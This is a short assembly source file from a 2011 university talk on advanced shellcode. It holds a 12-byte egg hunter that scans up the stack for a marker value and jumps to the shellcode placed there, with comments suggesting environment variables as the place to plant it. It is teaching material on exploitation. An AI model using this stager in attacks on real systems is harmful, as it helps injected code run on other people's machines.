;; Talk at Pwnies: Advanced shellcode
;; DIKU, fall 2011
;;
;; Morten Brøns-Pedersen
;;
;; Very simple egg hunter: starts at ESP and goes up the stack looking for
;; 0xDECAFBAD. This is useful if you are able to dump your shellcode somewhere
;; up high on the stack. And what are up high on the stack? Environment
;; variables!
;;
;; Just 12 bytes by the way.
;;
;; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

        bits 32
        %include "32.asm"
loop:   push eax
        inc esp
        pop eax
        cmp eax, 0xDECAFBAD
        jne short loop
        jmp esp
